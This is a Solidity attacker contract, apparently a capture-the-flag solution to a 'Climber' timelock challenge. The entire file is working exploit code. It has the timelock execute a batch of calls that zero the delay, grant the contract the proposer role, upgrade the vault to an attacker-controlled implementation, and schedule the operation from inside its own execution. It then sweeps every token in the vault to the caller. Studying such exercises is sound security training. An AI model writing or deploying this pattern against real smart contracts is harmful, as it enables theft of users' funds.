// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface Timelock {
    function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;

    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;
}

interface IClimber {
    function _setSweeper(address newSweeper) external;

    function sweepFunds(address tokenAddress) external;
}

contract ClimberAttacker {
    address timelock;
    address targetVault;
    address token;
    address climberV2;

    address[] targets;
    uint256[] values;
    bytes[] dataElements;
    bytes32 salt = "hacked!";

    constructor(
        address _timelock,
        address _targetVault,
        address _token,
        address _climberV2
    ) {
        timelock = _timelock;
        targetVault = _targetVault;
        token = _token;
        climberV2 = _climberV2;
    }

    function attack() public {
        console.log("CONTRACT::: Attacking!");
        Timelock tlock = Timelock(timelock);

        // Setup

        // Reduce Timer
        targets.push(timelock);
        values.push(0);
        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", 0));

        // Give role
        targets.push(timelock);
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                keccak256("PROPOSER_ROLE"),
                address(this)
            )
        );

        // Fake upgrade
        targets.push(targetVault);
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature("upgradeTo(address)", climberV2)
        );

        // Call self
        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("receiveCall()"));

        // Attacking Call
        tlock.execute(targets, values, dataElements, salt);

        // Set sweeper
        IClimber(targetVault)._setSweeper(address(this));
        IClimber(targetVault).sweepFunds(token);
        uint256 balance = IERC20(token).balanceOf(address(this));
        console.log("CONTRACT::: Received Tokens:", balance / 10**18);
        IERC20(token).transfer(msg.sender, balance);
    }

    function receiveCall() external {
        Timelock(timelock).schedule(targets, values, dataElements, salt);
        console.log("CONTRACT::: Scheduled operation!");
    }
}
